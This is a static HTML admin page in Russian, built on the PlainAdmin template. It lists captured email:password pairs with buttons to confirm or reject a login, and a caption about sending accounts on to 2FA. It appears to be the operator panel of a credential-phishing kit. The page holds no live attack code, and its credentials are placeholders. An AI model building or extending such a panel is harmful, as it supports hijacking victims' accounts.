<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="shortcut icon" href="assets/images/favicon.svg" type="image/x-icon" />
    <title>Tables | PlainAdmin Demo</title>

    <!-- ========== All CSS files linkup ========= -->
    <link rel="stylesheet" href="assets/css/bootstrap.min.css" />
    <link rel="stylesheet" href="assets/css/lineicons.css" />
    <link rel="stylesheet" href="assets/css/materialdesignicons.min.css" />
    <link rel="stylesheet" href="assets/css/fullcalendar.css" />
    <link rel="stylesheet" href="assets/css/main.css" />
</head>
<body>
<!-- ======== Preloader =========== -->

<!-- ======== Preloader =========== -->

<!-- ======== main-wrapper start =========== -->
<main class="main-wrapper">


    <!-- ========== table components start ========== -->
    <section class="table-components">
        <div class="container-fluid">
            <!-- ========== title-wrapper start ========== -->
            <div class="title-wrapper pt-30">
                <div class="row align-items-center">
                    <div class="col-md-6">
                        <div class="title">
                            <h2>Действия</h2>
                        </div>
                    </div>

                </div>
                <!-- end row -->
            </div>
            <!-- ========== title-wrapper end ========== -->

            <!-- ========== tables-wrapper start ========== -->
            <div class="tables-wrapper">
                <div class="row">
                    <div class="col-lg-12">
                        <div class="card-style mb-30">
                            <h6 class="mb-10">Данные</h6>
                            <p class="text-sm mb-20">
                                Здесь ты можешь принять/отклонить авторизацию или отправить на 2FA
                            </p>
                            <div class="table-wrapper table-responsive">
                                <table class="table">
                                    <thead>
                                    <tr>
                                        <th class="lead-info">
                                            <h6>Данные от аккаунта</h6>
                                        </th>
                                        <th class="lead-email">
                                            <h6>Этап</h6>
                                        </th>
                                        <th class="lead-phone">
                                            <h6>Дата </h6>
                                        </th>
                                        <th class="lead-phone">
                                            <h6># </h6>
                                        </th>

                                    </tr>
                                    <!-- end table row-->
                                    </thead>
                                    <tbody>
                                    <tr>
                                        <td class="min-width">
                                            <div class="lead">
                                                <div class="lead-image">

                                                </div>
                                                <div class="lead-text">
                                                    <p>asjdajsdjasjd@mail.ru:askdasdasd</p>
                                                </div>
                                            </div>
                                        </td>
                                        <td class="min-width">
                                            <p>Ожидание</p>
                                        </td>
                                        <td class="min-width">
                                            <p>12.24.12</p>
                                        </td>

                                        <td>
                                            <div class="action d-flex gap-2">
                                                <button class="p-1 main-btn primary-btn btn-hover">
                                                    Подтвердить вход
                                                </button>
                                                <button class="p-1 main-btn danger-btn btn-hover">
                                                    Отклонить вход
                                                </button>
                                            </div>
                                        </td>
                                    </tr>

                                    </tbody>
                                </table>
                                <!-- end table -->
                            </div>
                        </div>
                        <!-- end card -->
                    </div>
                    <!-- end col -->
                </div>
                <!-- end row -->

            </div>
            <div class="tables-wrapper">
                <div class="row">
                    <div class="col-lg-12">
                        <div class="card-style mb-30">
                            <h6 class="mb-10">Аккаунты с завершенными этапами</h6>
                            <p class="text-sm mb-20">
                                Здесь ты можешь увидеть аккаунты которые завершили вход
                            </p>
                            <div class="table-wrapper table-responsive">
                                <table class="table">
                                    <thead>
                                    <tr>
                                        <th class="lead-info">
                                            <h6>Данные от аккаунта</h6>
                                        </th>
                                        <th class="lead-email">
                                            <h6>Этап</h6>
                                        </th>
                                        <th class="lead-phone">
                                            <h6>Дата </h6>
                                        </th>


                                    </tr>
                                    <!-- end table row-->
                                    </thead>
                                    <tbody>
                                    <tr>
                                        <td class="min-width">
                                            <div class="lead">
                                                <div class="lead-image">

                                                </div>
                                                <div class="lead-text">
                                                    <p>asjdajsdjasjd@mail.ru:askdasdasd</p>
                                                </div>
                                            </div>
                                        </td>
                                        <td class="min-width">
                                            <p>Ожидание</p>
                                        </td>
                                        <td class="min-width">
                                            <p>12.24.12</p>
                                        </td>


                                    </tr>

                                    </tbody>
                                </table>
                                <!-- end table -->
                            </div>
                        </div>
                        <!-- end card -->
                    </div>
                    <!-- end col -->
                </div>
                <!-- end row -->

            </div>
        </div>
        <!-- end container -->
    </section>
    <!-- ========== table components end ========== -->


</main>
<!-- ======== main-wrapper end =========== -->

<!-- ========= All Javascript files linkup ======== -->
<script src="assets/js/bootstrap.bundle.min.js"></script>
<script src="assets/js/Chart.min.js"></script>
<script src="assets/js/dynamic-pie-chart.js"></script>
<script src="assets/js/moment.min.js"></script>
<script src="assets/js/fullcalendar.js"></script>
<script src="assets/js/jvectormap.min.js"></script>
<script src="assets/js/world-merc.js"></script>
<script src="assets/js/polyfill.js"></script>
<script src="assets/js/main.js"></script>
</body>
</html>
